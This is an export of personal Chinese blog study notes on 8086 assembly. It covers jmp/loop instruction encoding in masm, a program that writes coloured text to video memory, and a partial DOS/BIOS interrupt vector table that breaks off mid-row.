		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=94</guid>
		<description></description>
		<content:encoded><![CDATA[知识在于积累，向着自己想要的未来前行。

<strong>转移指令</strong>：可以修改IP，或同时修改CS和IP的指令统称为转移指令。概括的讲，转移指令就是可以控制CPU执行内存中某处的代码。只修改IP，成为段内转移，比如：jmp ax；同时修改CS和IP称为段间转移。

8086CPU的转移指令分为以下几类：
<ul>
	<li>无条件转移指令（如jmp）</li>
	<li>条件转移指令</li>
	<li>循环指令（如loop）</li>
	<li>过程（call）</li>
	<li>中断</li>
</ul>
<strong>jmp指令</strong>：jmp指令为无条件转移指令，可只修改IP，也可同时修改CS和IP。jmp指令要给出两种信息：（1）转移的目的地址；（2）转移的距离（段间转移、段内短转移、段内近转移）。

<strong>jmp short 标号</strong>：此格式的转移指令所对应的机器码中转移的目的地址，仅包含了CPU要转移的位移，即当前IP移动多少字节，此位移是编译器根据“标号”计算出来的。由此，此指令的实际功能为：(IP) = (IP) + 8位位移，故其转移的范围是-128~127。

指令jmp near 标号和jmp short 标号功能一样，不同的是包含16位的位移，称之为段内近转移。jmp far ptr 标号就不一样了，它以标号所在段的段地址作为CS的值，标号所在段中的偏移作为IP的值，其机器码中包含转移的段地址和偏移地址，用以实现段间转移。

另外，jmp指令还有两种转移地址在内存中的格式：jmp word ptr 内存单元地址（段内转移）；jmp dword ptr 内存单元地址（段间转移）。第二种以低地址处的字作为IP，高地址处的字作为CS。

<strong>jcxz指令</strong>：为有条件转移指令，转移范围：-128~127。功能相当于：if ((cx) == 0) jmp short 标号。

<strong>loop指令</strong>：为循环指令，所有循环指令都是短转移（转移范围：-128~127）。功能相当于：(cx)--; if( (cx) != 0) jmp short 标号。

<strong>根据位移进行转移的意义是为了方便程序段在内存中的浮动装配</strong>。

<strong>masm对jmp的相关处理</strong>：<strong>编译器中有一个地址计数器（AC），编译器在编译程序的过程中，每读到一个字节AC就加1。当编译器遇到一些伪操作时，也会根据具体情况使AC增加，如db、dw等</strong>。

在<strong>向前转移</strong>时，编译器在读到标号的时候记下AC的值as，在读到jmp...s后记下AC的值aj。编译器可以用as - aj算出位移量disp。此时编译器做如下处理：
（1）如果disp 在[-128~127]之间，那么无论jmp s、jmp short s、jmp near ptr s、jmp far ptr s均转换为jmp short s所对应的机器码：EB disp。
（2）如果disp 在[-32768~32767]之间，jmp short s将产生编译错误，jmp s 和jmp near ptr s 将产生 jmp near ptr s所对应的机器码，格式为：E9 disp(占3字节)。jmp far ptr s 将产生相应的编码，格式为：EA 偏移地址 段地址（5字节）。

<strong>向后转移</strong>时，编译器将先读到 jmp...s 指令，由于还未读到标号s，所以编译器此时还不能确定s处AC的值，也就是说编译器还能确定位移量disp的大小。此时编译器讲 jmp...s 指令都当做 jmp short s 来处理，记下 jmp...s 指令处指令的位置和AC值aj。

对于 jmp short s 指令，编译器生成 EB nop（预留1个字节空间，存放8位disp）；对于 jmp s 和 jmp near ptr s指令，编译器生成 EB nop nop（预留2个字节空间，存放16位disp）；对于 jmp far ptr s，编译器生成 EB nop nop nop nop（预留5个字节空间，存放段地址和偏移地址）。

编译器作完以上处理后，继续工作，当向后读到标号 s 时，记下AC值 as，并计算出位移量：disp = as - aj。此时编译器作如下处理：
 （1）如果disp 在[-128~127]之间，那么无论jmp s、jmp short s、jmp near ptr s、jmp far ptr s均转换为jmp short s所对应的机器码。jmp s 和jmp near ptr s 格式的机器码 EB disp 后面还有一个nop；jmp far ptr s机器码 EB disp 还有3条nop。
（2）如果disp 在[-32768~32767]之间，jmp short s将产生编译错误，jmp s、jmp near ptr s在前面记下的 jmp...s 指令处添上 jmp near ptr s所对应的机器码：E9 disp；jmp far ptr s在前面记下的 jmp...s 指令处舔上相应的代码。







]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>94</wp:post_id>
		<wp:post_date>2011-09-15 22:34:01</wp:post_date>
		<wp:post_date_gmt>2011-09-15 14:34:01</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e8%bd%ac%e7%a7%bb%e6%8c%87%e4%bb%a4</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[12]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359071]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>9</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94welcome-to-masm/attachment/9/</link>
		<pubDate>Tue, 20 Sep 2011 04:36:43 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp04/M00/02/06/wKgKDE54GFsAAAAAAACf_DUGsYk300.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>98</wp:post_id>
		<wp:post_date>2011-09-20 12:36:43</wp:post_date>
		<wp:post_date_gmt>2011-09-20 04:36:43</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>9</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>97</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp04/M00/02/06/wKgKDE54GFsAAAAAAACf_DUGsYk300.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"657";s:6:"height";s:3:"440";s:14:"hwstring_small";s:23:"height='85' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/02/06/wKgKDU54GFsAAAAAAAAQHjnQNnQ659.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"125";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/02/06/wKgKDU54GFsAAAAAAABECCYClJs446.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"330";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/02/EF/wKgKDE54GFsAAAAAAADhe2XVwoo541.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/02/06/wKgKDU54GFsAAAAAAACf_ALKpNM286.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>F6_55</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94welcome-to-masm/f6_55/</link>
		<pubDate>Tue, 20 Sep 2011 04:39:23 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/02/3F/wKgKC054GPsAAAAAAACuITkQhGQ743.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>99</wp:post_id>
		<wp:post_date>2011-09-20 12:39:23</wp:post_date>
		<wp:post_date_gmt>2011-09-20 04:39:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>f6_55</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>97</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/02/3F/wKgKC054GPsAAAAAAACuITkQhGQ743.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"358";s:6:"height";s:3:"590";s:14:"hwstring_small";s:22:"height='96' width='58'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/3D/wKgKCk54GPsAAAAAAAAPa0YNDiw441.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"114";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/3F/wKgKC054GPsAAAAAAAAkritcfVM143.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"299";s:6:"height";s:3:"494";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/02/44/wKgKCk54GPsAAAAAAADEiiQtlg0525.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/02/EF/wKgKDE54GPsAAAAAAACuIRbNugQ549.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——welcome to masm!</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94welcome-to-masm/</link>
		<pubDate>Tue, 20 Sep 2011 05:17:39 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[汇编]]></category>

		<category domain="tag" nicename="%e6%b1%87%e7%bc%96"><![CDATA[汇编]]></category>

		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=97</guid>
		<description></description>
		<content:encoded><![CDATA[生亦何欢 死亦何悲！

实验内容：
编程，在屏幕中间分别显示绿色，绿底红字，白底蓝字的字符串‘welcome to masm!’。

阅读材料：
80*25彩色字符模式显示缓冲区的结构：内存地址空间中，B8000H~BFFFFH共32KB的空间，为80*25彩色字符模式的显示缓冲区，向这个地址空间写入数据，写入的内容会立即出现在显示器上。

在80*25彩色字符模式下，显示器可以显示25行，每行80个字符，每个字符有256种属性（背景色、前景色、闪烁、高亮等组合信息）。这样一个字符在显示缓冲区中就要占2个字节，分别存放字符的ASCII码和属性。80*25彩色模式下，一屏的内容在显示缓存中要占用4000个字节。

显示缓冲区分为8页，每页4KB，显示器可以显示任意一页的内容。一般情况下，显示第0页的内容。也就是说通常情况下，B8000H~B8F9FH中的4000个字节的内容将出现在显示器上。

在显示缓存中，偶地址存放字符，奇地址存放字符的颜色属性。

颜色属性字节的格式：
7   6  5  4   3   2  1  0
BL  R  G  B   I   R  G  B
闪烁  背景   高亮   前景

代码：
<pre class="asm">
assume cs:code, ds:data, ss:stack

data segment
	db 'welcome to masm!'
	db 02h	;绿字
	db 24h	;绿底红字
	db 71h	;白底蓝字
data ends

stack segment
	dw 0,0,0,0,0,0,0,0
stack ends

code segment
start:
	mov ax, data
	mov ds, ax
	mov ax, stack
	mov ss, ax
	mov sp, 10h
	mov ax, 0B800h	;12-14行 0B86e0h
	mov es, ax
</br>		
	mov bx, 6e0h
	mov bp, 10h		;color
	mov cx, 3
s:
	push cx
	mov cx, 10h		;16 char
	mov si, 40h		;80个字符一行，半行40个字符，16个字符居中
	xor di, di		;则40 - 16/2 = 32, 32*2 = 64
s0:
	mov ah, 0
	mov al, [di]
	mov es:[bx+si], al	;字母
	inc si
	inc di
	mov al, ds:[bp]		;颜色 必须加上ds, bp默认es为段地址
	mov es:[bx+si],al
	inc si
	loop s0
</br>		
	add bx, 0a0h	;80个字符*2 160个字节
	inc bp
	pop cx
	loop s
</br>	
	mov ax, 4c00h
	int 21h
code ends
end start
</pre>
运行结果图，奇怪的是win7下必须先运行debug才能显示，XP无此现象。

<img src="http://files.blogcn.com/wp04/M00/02/06/wKgKDE54GFsAAAAAAACf_DUGsYk300.png" alt="9.png" />

附一张内存地址图，地址未核实：
<img src="http://files.blogcn.com/wp01/M00/02/3F/wKgKC054GPsAAAAAAACuITkQhGQ743.jpg" alt="" />
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>97</wp:post_id>
		<wp:post_date>2011-09-20 13:17:39</wp:post_date>
		<wp:post_date_gmt>2011-09-20 05:17:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94welcome-to-masm</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[14]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359066]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>中断向量表</title>
		<link>http://codemylife.blogcn.com/2011/09/%e4%b8%ad%e6%96%ad%e5%90%91%e9%87%8f%e8%a1%a8/</link>
		<pubDate>Tue, 20 Sep 2011 09:34:41 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[汇编]]></category>

		<category domain="tag" nicename="%e6%b1%87%e7%bc%96"><![CDATA[汇编]]></category>

		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=100</guid>
		<description></description>
		<content:encoded><![CDATA[<table border="1" bordercolor="#9999ff" width="610">
    <tbody>
        <tr>
            <td bgcolor="#9999ff" width="20"><font color="#ffffff">绝对地址</font></td>
            <td bgcolor="#9999ff" width="20"><font color="#ffffff">16进制</font></td>
            <td bgcolor="#9999ff" width="20"><font color="#ffffff">10进制</font></td>
            <td bgcolor="#9999ff" width="200"><font color="#ffffff">有关内容</font></td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">00H</font></td>
            <td width="20" align="center"><font color="#000000">0H</font></td>
            <td width="20"><font color="#000080">0</font></td>
            <td width="200">0做除数时处理器发出的中断 溢出条件是：
            <p>除法类型 结果<br>
            ---------------------------------<br>
            有符号字 &lt;-128 | &gt;+127<br>
            有符号双字 &lt;-32768 | &gt;+32767<br>
            无符号字 | &gt;255<br>
            无符号双字 | &gt;65535<br>
            ---------------------------------<br>
            DOS设有INT 00H处理程序，系统将显示&ldquo;Divide Overflo&rdquo;，结束当前程序的执行。</p>
            </td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">04H</font></td>
            <td width="20" align="center"><font color="#000000">1H</font></td>
            <td width="20"><font color="#000080">1</font></td>
            <td width="200">单步调试时处理器发出的中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">08H</font></td>
            <td width="20" align="center"><font color="#000000">2H</font></td>
            <td width="20"><font color="#000080">2</font></td>
            <td width="200">非屏蔽中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">0CH</font></td>
            <td width="20" align="center"><font color="#000000">3H</font></td>
            <td width="20"><font color="#000080">3</font></td>
            <td width="200">调试程序设置断点时处理器发出的中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">10H</font></td>
            <td width="20" align="center"><font color="#000000">4H</font></td>
            <td width="20"><font color="#000080">4</font></td>
            <td width="200">发生算术溢出时处理器发出的中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">14H</font></td>
            <td width="20" align="center"><font color="#000000">5H</font></td>
            <td width="20"><font color="#000080">5</font></td>
            <td width="200">调用BIOS的屏幕拷贝操作</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">18-1FH</font></td>
            <td width="20" align="center"><font color="#000000">6-7H</font></td>
            <td width="20"><font color="#000080">6-7</font></td>
            <td width="200">保留单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">20H</font></td>
            <td width="20" align="center"><font color="#000000">8H</font></td>
            <td width="20"><font color="#000080">8</font></td>
            <td width="200">每1/18.2秒定时器发出的中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">24H</font></td>
            <td width="20" align="center"><font color="#000000">9H</font></td>
            <td width="20"><font color="#000080">9</font></td>
            <td width="200">按压或释放键时产生的中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">28H</font></td>
            <td width="20" align="center"><font color="#000000">0AH</font></td>
            <td width="20"><font color="#000080">10</font></td>
            <td width="200">保留单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">2CH</font></td>
            <td width="20" align="center"><font color="#000000">0BH</font></td>
            <td width="20"><font color="#000080">11</font></td>
            <td width="200">通讯设备使用的硬件中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">30H</font></td>
            <td width="20" align="center"><font color="#000000">0CH</font></td>
            <td width="20"><font color="#000080">12</font></td>
            <td width="200">通讯设备使用的硬件中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">34H</font></td>
            <td width="20" align="center"><font color="#000000">0DH</font></td>
            <td width="20"><font color="#000080">13</font></td>
            <td width="200">交替打印时硬件产生的中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">38H</font></td>
            <td width="20" align="center"><font color="#000000">0EH</font></td>
            <td width="20"><font color="#000080">14</font></td>
            <td width="200">软驱操作结束时产生的硬件中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">3CH</font></td>
            <td width="20" align="center"><font color="#000000">0FH</font></td>
            <td width="20"><font color="#000080">15</font></td>
            <td width="200">打印机发出警告信号时产生的硬件中断</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">40H</font></td>
            <td width="20" align="center"><font color="#000000">10H</font></td>
            <td width="20"><font color="#000080">16</font></td>
            <td width="200">BIOS的显示I/O功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">44H</font></td>
            <td width="20" align="center"><font color="#000000">11H</font></td>
            <td width="20"><font color="#000080">17</font></td>
            <td width="200">BIOS设备确认调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">48H</font></td>
            <td width="20" align="center"><font color="#000000">12H</font></td>
            <td width="20"><font color="#000080">18</font></td>
            <td width="200">BIOS确认内存空间大小的功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">4CH</font></td>
            <td width="20" align="center"><font color="#000000">13H</font></td>
            <td width="20"><font color="#000080">19</font></td>
            <td width="200">BOIS的磁盘I/O功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">50H</font></td>
            <td width="20" align="center"><font color="#000000">14H</font></td>
            <td width="20"><font color="#000080">20</font></td>
            <td width="200">BIOS的RS-232串行I/O功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">54H</font></td>
            <td width="20" align="center"><font color="#000000">15H</font></td>
            <td width="20"><font color="#000080">21</font></td>
            <td width="200">在PC和XT机上是BIOS磁带I/O功能调用。在AT机上是AT扩充服务功能调用。</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">58H</font></td>
            <td width="20" align="center"><font color="#000000">16H</font></td>
            <td width="20"><font color="#000080">22</font></td>
            <td width="200">BIOS的键盘I/O功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">5CH</font></td>
            <td width="20" align="center"><font color="#000000">17H</font></td>
            <td width="20"><font color="#000080">23</font></td>
            <td width="200">BIOS的打印机I/O功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">60H</font></td>
            <td width="20" align="center"><font color="#000000">18H</font></td>
            <td width="20"><font color="#000080">24</font></td>
            <td width="200">ROM的BASIC解释和程序功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">64H</font></td>
            <td width="20" align="center"><font color="#000000">19H</font></td>
            <td width="20"><font color="#000080">25</font></td>
            <td width="200">BIOS的装载引导服务调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">68H</font></td>
            <td width="20" align="center"><font color="#000000">1AH</font></td>
            <td width="20"><font color="#000080">26</font></td>
            <td width="200">BIOS的日期时钟功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">6CH</font></td>
            <td width="20" align="center"><font color="#000000">1BH</font></td>
            <td width="20"><font color="#000080">27</font></td>
            <td width="200">Ctrl+Break处理程序功能调用。当键入Ctrl+Break键时指向可执行的程序入口初始化BIOS使该向量指向一条TRET指令。用户可修改该向量，使它指向自己的程序。</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">70H</font></td>
            <td width="20" align="center"><font color="#000000">1CH</font></td>
            <td width="20"><font color="#000080">28</font></td>
            <td width="200">指向每1/18.2秒时可执行的服务程序的入口。初始化时该向量指向一条IRET指令。用户可修改该向量，使它指向自己的Ctrl+Break 处理程序。</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">74H</font></td>
            <td width="20" align="center"><font color="#000000">1DH</font></td>
            <td width="20"><font color="#000080">29</font></td>
            <td width="200">指向显示控制器初始化参数。BIOS使这个向量指向ROM驻留表。</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">78H</font></td>
            <td width="20" align="center"><font color="#000000">1EH</font></td>
            <td width="20"><font color="#000080">30</font></td>
            <td width="200">指向软盘参数表。BIOS使这个向量指向ROM 驻留表，但是DOS把它改为指向DOS的RAM 驻留表。</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">7CH</font></td>
            <td width="20" align="center"><font color="#000000">1FH</font></td>
            <td width="20"><font color="#000080">31</font></td>
            <td width="200">指向一点阵表。在这个表中，BIOS可以找到字符集后128个字符的点阵</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">80H</font></td>
            <td width="20" align="center"><font color="#000000">20H</font></td>
            <td width="20"><font color="#000080">32</font></td>
            <td width="200">终止程序的DOS功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">84H</font></td>
            <td width="20" align="center"><font color="#000000">21H</font></td>
            <td width="20"><font color="#000080">33</font></td>
            <td width="200">任何种DOS功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">88H</font></td>
            <td width="20" align="center"><font color="#000000">22H</font></td>
            <td width="20"><font color="#000080">34</font></td>
            <td width="200">指向DOS的结束地址</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">8CH</font></td>
            <td width="20" align="center"><font color="#000000">23H</font></td>
            <td width="20"><font color="#000080">35</font></td>
            <td width="200">指向DOS的Ctrl+Break处理程序</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">90H</font></td>
            <td width="20" align="center"><font color="#000000">24H</font></td>
            <td width="20"><font color="#000080">36</font></td>
            <td width="200">指向DOS的严重错误处理程序</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">94H</font></td>
            <td width="20" align="center"><font color="#000000">25H</font></td>
            <td width="20"><font color="#000080">37</font></td>
            <td width="200">DOS绝对磁盘读调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">98H</font></td>
            <td width="20" align="center"><font color="#000000">26H</font></td>
            <td width="20"><font color="#000080">38</font></td>
            <td width="200">DOS绝对磁盘写调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">9CH</font></td>
            <td width="20" align="center"><font color="#000000">27H</font></td>
            <td width="20"><font color="#000080">39</font></td>
            <td width="200">程序终止，但仍驻留内存的DOS功能调用</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">9DH</font></td>
            <td width="20" align="center"><font color="#000000">28H</font></td>
            <td width="20"><font color="#000080">40</font></td>
            <td width="200">DOS空闲</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">9EH</font></td>
            <td width="20" align="center"><font color="#000000">29H</font></td>
            <td width="20"><font color="#000080">41</font></td>
            <td width="200">支持驱动器程序输出</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">9FH-A1H</font></td>
            <td width="20" align="center"><font color="#000000">2AH-2CH</font></td>
            <td width="20"><font color="#000080">42-44</font></td>
            <td width="200">保留单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">A2H</font></td>
            <td width="20" align="center"><font color="#000000">2DH</font></td>
            <td width="20"><font color="#000080">45</font></td>
            <td width="200">DOS构件接口</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">A3H</font></td>
            <td width="20" align="center"><font color="#000000">2EH</font></td>
            <td width="20"><font color="#000080">46</font></td>
            <td width="200">COMMAND.COM退回入口</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">A4H</font></td>
            <td width="20" align="center"><font color="#000000">2FH</font></td>
            <td width="20"><font color="#000080">47</font></td>
            <td width="200">多路中断（空闲信号）</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">A5-FFH</font></td>
            <td width="20" align="center"><font color="#000000">30-3FH</font></td>
            <td width="20"><font color="#000080">48-63</font></td>
            <td width="200">为DOS保留的单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">100H</font></td>
            <td width="20" align="center"><font color="#000000">40H</font></td>
            <td width="20"><font color="#000080">64</font></td>
            <td width="200">保留单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">104H</font></td>
            <td width="20" align="center"><font color="#000000">41H</font></td>
            <td width="20"><font color="#000080">65</font></td>
            <td width="200">指向硬盘0的参数表，BOIS使这个向量指向ROM驻留的表。</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">108-10FH</font></td>
            <td width="20" align="center"><font color="#000000">42-43H</font></td>
            <td width="20"><font color="#000080">66-67</font></td>
            <td width="200">保留单元</td>
        </tr>
        <tr>
            <td width="20"><font color="#0000ff">110H</font></td>
            <td width="20" align="center"><font color="#000000">44H</font></td>
            <td width="20"><font color="#000080">68</font></td>
            <td width="200">PC机使用，用于指向低分辩率图形字符参数表</td>
        </tr>
        <tr>
